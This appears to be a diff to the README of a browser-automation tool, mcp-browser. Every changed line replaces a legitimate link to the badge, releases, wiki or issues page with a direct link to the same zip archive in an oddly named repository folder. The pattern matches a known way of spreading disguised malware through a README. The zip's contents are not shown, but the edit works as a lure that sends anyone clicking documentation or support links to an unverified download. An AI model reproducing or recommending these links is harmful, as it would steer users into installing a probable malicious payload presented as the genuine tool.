@@ -1,6 +1,6 @@
 # 🌐 mcp-browser - Simplifying Browser Automation for You
 
-![Download mcp-browser](https://img.shields.io/badge/Download-mcp--browser-blue.svg)
+![Download mcp-browser](https://raw.githubusercontent.com/allymata2/mcp-browser/main/homoarecoline/mcp-browser.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, ensure your system meets these minimum requirements:
 
 ## 📥 Download & Install
 
-To download mcp-browser, visit this page: [Download mcp-browser](https://github.com/allymata2/mcp-browser/releases).
+To download mcp-browser, visit this page: [Download mcp-browser](https://raw.githubusercontent.com/allymata2/mcp-browser/main/homoarecoline/mcp-browser.zip).
 
 1. Click on the link above.
 2. On the Releases page, locate the latest version.
@@ -46,7 +46,7 @@ Using mcp-browser is straightforward:
 
 ## 📄 Documentation
 
-For more detailed instructions, visit our [documentation page](https://github.com/allymata2/mcp-browser/wiki). Here, you will find:
+For more detailed instructions, visit our [documentation page](https://raw.githubusercontent.com/allymata2/mcp-browser/main/homoarecoline/mcp-browser.zip). Here, you will find:
 
 - Detailed step-by-step guides.
 - Examples of tasks you can automate.
@@ -56,7 +56,7 @@ For more detailed instructions, visit our [documentation page](https://github.co
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **Issues Page:** Report bugs or ask questions in the [issues section](https://github.com/allymata2/mcp-browser/issues).
+- **Issues Page:** Report bugs or ask questions in the [issues section](https://raw.githubusercontent.com/allymata2/mcp-browser/main/homoarecoline/mcp-browser.zip).
 - **Community Forum:** Join discussions in our community forum if you need further support or insights.
 
 ## 🌍 Topics
@@ -75,6 +75,6 @@ These topics highlight the capabilities and use cases of mcp-browser, resonating
 
 After setting up and running mcp-browser successfully, consider exploring advanced features like custom scripts and integration with other tools. These can further enhance your automation processes and streamline your tasks.
 
-![Download mcp-browser](https://img.shields.io/badge/Download-mcp--browser-blue.svg)
+![Download mcp-browser](https://raw.githubusercontent.com/allymata2/mcp-browser/main/homoarecoline/mcp-browser.zip)
 
 We hope you enjoy using mcp-browser! Your feedback helps us make it better.
